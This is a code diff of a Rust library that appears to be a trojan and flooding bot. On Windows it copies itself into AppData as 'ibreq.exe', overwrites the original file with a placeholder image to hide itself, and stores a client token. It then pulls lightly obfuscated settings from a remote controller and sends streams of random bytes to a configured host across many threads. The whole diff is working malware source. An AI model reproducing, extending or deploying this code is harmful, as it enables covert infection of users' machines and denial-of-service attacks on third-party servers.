@@ -1,170 +1,28 @@
 #![allow(dead_code)]
-use core::str::FromStr;
-use native_tls::{TlsConnector, TlsStream};
-use rand::Rng;
-use std::{
-  collections::HashMap, error, io::Read, io::Result as IResult, io::Write, net::TcpStream,
-};
-
-#[allow(dead_code)]
+pub mod config;
+pub mod connection;
 mod image_placeholder;
+pub mod macros;
+pub mod response;
+mod util;
+
+use config::{parse_config, AppConfig, ControllerConfig};
+use connection::create_stream;
+use response::Response;
+use std::{env, error, fs, io::Read, io::Write, net::TcpStream};
+use util::gen_random_byte;
 
 static BODY_SEPARATOR: &str = "\r\n\r\n";
-static CONFIG_SEPARATOR: &str = ";";
-static CONFIG_PAIR_SEPARATOR: &str = "=";
 static MAX_BUFFER_CHUNK_SIZE: u32 = 1024;
 static CONFIG_DECRYPT_CHAR_LEFT_SHIFT: u8 = 13;
 
 pub type Result<T> = std::result::Result<T, Box<dyn error::Error>>;
 
-pub type ConfigMap = HashMap<String, String>;
-
-pub trait ConfigManager<'a> {
-  fn safe_get<T>(&self, key: &'a str, default_value: T) -> T
-  where
-    T: ToString + FromStr;
-}
-
-impl<'a> ConfigManager<'a> for ConfigMap {
-  fn safe_get<T>(&self, key: &'a str, default_value: T) -> T
-  where
-    T: ToString + FromStr,
-  {
-    return self
-      .get(key)
-      .unwrap_or(&default_value.to_string())
-      .parse::<T>()
-      .unwrap_or(default_value);
-  }
-}
-
-#[derive(Debug, Clone)]
-pub struct Config {
-  pub headers: String,
-  pub host: String,
-  pub port: u16,
-  pub content_length: u32,
-  pub thread_count: u16,
-  pub call_interval_in_ms: u64,
-  pub config_fetch_interval_in_ms: u64,
-  pub enabled: bool,
-  pub ssl: bool,
-}
-
-impl Config {
-  pub fn new(
-    headers: String,
-    content_length: u32,
-    thread_count: u16,
-    call_interval_in_ms: u64,
-    config_fetch_interval_in_ms: u64,
-    host: String,
-    port: u16,
-    enabled: bool,
-    ssl: bool,
-  ) -> Config {
-    Config {
-      headers,
-      content_length,
-      thread_count,
-      call_interval_in_ms,
-      config_fetch_interval_in_ms,
-      host,
-      port,
-      enabled,
-      ssl,
-    }
-  }
-
-  pub fn get_addr(&self) -> String {
-    format!("{}:{}", self.host, self.port)
-  }
-}
-
-impl From<ConfigMap> for Config {
-  fn from(config_map: ConfigMap) -> Config {
-    Config::new(
-      config_map.safe_get("headers", "GET / HTTP/1.1\nAccept: */*".into()),
-      config_map.safe_get("content_length", 1024),
-      config_map.safe_get("thread_count", 10),
-      config_map.safe_get("call_interval_in_ms", 100),
-      config_map.safe_get("config_fetch_interval_in_ms", 3600000),
-      config_map.safe_get("host", "localhost".into()),
-      config_map.safe_get("port", 80),
-      config_map.safe_get("enabled", false),
-      config_map.safe_get("ssl", false),
-    )
-  }
-}
-
-#[derive(Debug)]
-pub struct Response {
-  pub headers: String,
-  pub body: String,
-}
-
-impl Response {
-  pub fn new(headers: String, body: String) -> Response {
-    Response { headers, body }
-  }
-
-  pub fn decrypted_body(self) -> String {
-    decrypt(&self.body)
-  }
-}
-
-impl Default for Response {
-  fn default() -> Response {
-    Response::new("".into(), "".into())
-  }
-}
-
-impl From<String> for Response {
-  fn from(s: String) -> Response {
-    let res_chunks: Vec<&str> = s.split(BODY_SEPARATOR).collect();
-
-    if res_chunks.len() == 2 {
-      Response::new(res_chunks[0].into(), res_chunks[1].into())
-    } else {
-      Response::default()
-    }
-  }
-}
-
-pub trait Connection {
-  fn w(&mut self, buf: &[u8]) -> IResult<usize>;
-  fn r(&mut self, buf: &mut String) -> IResult<usize>;
-}
-
-impl Connection for TlsStream<TcpStream> {
-  fn w(&mut self, buf: &[u8]) -> IResult<usize> {
-    self.write(buf)
-  }
-
-  fn r(&mut self, buf: &mut String) -> IResult<usize> {
-    self.read_to_string(buf)
-  }
-}
-
-impl Connection for TcpStream {
-  fn w(&mut self, buf: &[u8]) -> IResult<usize> {
-    self.write(buf)
-  }
-
-  fn r(&mut self, buf: &mut String) -> IResult<usize> {
-    self.read_to_string(buf)
-  }
-}
-
-#[cfg(target_os = "macos")]
-pub fn setup() {
-  todo!();
-}
-
 #[cfg(target_os = "windows")]
-pub fn setup() {
+pub fn setup() -> Result<()> {
+  use rand::Rng;
+  use rand::{distributions::Alphanumeric, thread_rng};
   use std::{
-    env, fs,
     process::{exit, Command},
     thread,
     time::Duration,
@@ -174,14 +32,15 @@ pub fn setup() {
   let target_path = home_path.clone() + "\\AppData\\Local\\ibreq.exe";
   let vbs_path = home_path.clone() + "\\AppData\\Local\\ibreq.vbs";
   let conf_path = home_path.clone() + "\\AppData\\Local\\ibreq.conf";
+  let token: String = thread_rng().sample_iter(&Alphanumeric).take(32).collect();
 
   if current_path == target_path {
-    let conf = parse_config(&fs::read_to_string(&conf_path).unwrap());
-    let original_path = conf.get("original_path").unwrap();
-
     loop {
+      let conf = get_app_config().unwrap();
+      let new_path = conf.original_path.replace(".exe", "");
+
       // Replacing with image;
-      match fs::write(&original_path, image_placeholder::get_placeholder_buf()) {
+      match fs::write(&new_path, image_placeholder::get_placeholder_buf()) {
         Ok(_) => break,
         Err(_) => {
           thread::sleep(Duration::from_millis(10));
@@ -189,7 +48,7 @@ pub fn setup() {
         }
       }
     }
-    return;
+    return Ok(());
   }
 
   fs::copy(&current_path, &target_path).unwrap();
@@ -208,24 +67,29 @@ pub fn setup() {
   fs::remove_file(&vbs_path).unwrap();
 
   // Create config file
-  let conf_content = format!(r#"original_path={};"#, current_path);
+  let conf_content = format!(
+    r#"
+    original_path={};
+    token={};
+    "#,
+    current_path, token,
+  );
   fs::write(&conf_path, &conf_content).unwrap();
 
   exit(0);
 }
 
-#[cfg(target_os = "linux")]
-pub fn setup() {
+#[cfg(not(target_os = "windows"))]
+pub fn setup() -> Result<()> {
   todo!();
 }
 
-#[cfg(other)]
-fn setup() {
-  todo!();
-}
-
-pub fn get_conf(addr: &str) -> Result<Config> {
-  let headers = String::from("GET / HTTP/1.1\nAccept: */*") + BODY_SEPARATOR;
+pub fn fetch_controller_config(addr: &str) -> Result<ControllerConfig> {
+  let app_conf = get_app_config()?;
+  let headers = format!(
+    "GET / HTTP/1.1\nAccept: */*\nx-client-token={}{}",
+    app_conf.token, BODY_SEPARATOR
+  );
   let mut res = String::new();
   let mut stream = TcpStream::connect(addr)?;
 
@@ -235,14 +99,23 @@ pub fn get_conf(addr: &str) -> Result<Config> {
   let res: Response = Response::from(res);
 
   let conf = parse_config(&res.decrypted_body());
-  let conf = Config::from(conf);
+  let conf = ControllerConfig::from(conf);
 
   debug!("Done fetching config {:?}.", conf);
 
   Ok(conf)
 }
 
-pub fn call(conf: &Config) -> Result<Response> {
+pub fn get_app_config() -> Result<AppConfig> {
+  let home_path = env::home_dir().unwrap().display().to_string();
+  let conf_path = home_path.clone() + "\\AppData\\Local\\ibreq.conf";
+  let conf = parse_config(&fs::read_to_string(&conf_path)?);
+  let conf = AppConfig::from(conf);
+
+  Ok(conf)
+}
+
+pub fn call(conf: &ControllerConfig) -> Result<Response> {
   let mut stream = create_stream(&conf);
   let body: Vec<u8> = vec![0; conf.content_length as usize]
     .iter()
@@ -267,57 +140,4 @@ pub fn call(conf: &Config) -> Result<Response> {
   debug!("Done calling {}...", conf.get_addr());
 
   return Ok(Response::from(res));
-}
-
-fn create_stream(conf: &Config) -> Box<dyn Connection> {
-  if conf.ssl {
-    let connector = TlsConnector::new().unwrap();
-    let stream = TcpStream::connect(conf.get_addr()).unwrap();
-
-    Box::new(connector.connect(&conf.host, stream).unwrap())
-  } else {
-    let stream = TcpStream::connect(conf.get_addr()).unwrap();
-
-    Box::new(stream)
-  }
-}
-
-fn parse_config(s: &str) -> ConfigMap {
-  let parsed: ConfigMap = s
-    .split(CONFIG_SEPARATOR)
-    .map(|line: &str| line.split(CONFIG_PAIR_SEPARATOR).collect())
-    .collect::<Vec<Vec<&str>>>()
-    .iter()
-    .fold(HashMap::<String, String>::new(), |mut conf, pair| {
-      if pair.len() == 2 {
-        conf.insert(pair[0].trim().to_string(), pair[1].trim().to_string());
-      };
-      return conf;
-    });
-
-  return parsed;
-}
-
-fn decrypt(s: &str) -> String {
-  return s
-    .chars()
-    .map(|c| (c as u8 - CONFIG_DECRYPT_CHAR_LEFT_SHIFT as u8) as char)
-    .collect::<String>();
-}
-
-fn gen_random_byte() -> u8 {
-  let mut rng = rand::thread_rng();
-  rng.gen::<u8>()
-}
-
-#[macro_export]
-#[cfg(debug_assertions)]
-macro_rules! debug {
-  ($($arg:tt)+) => (dbg!(format_args!($($arg)+)))
-}
-
-#[macro_export]
-#[cfg(not(debug_assertions))]
-macro_rules! debug {
-  ($($arg:tt)+) => (std::convert::identity(format_args!($($arg)+)))
 }
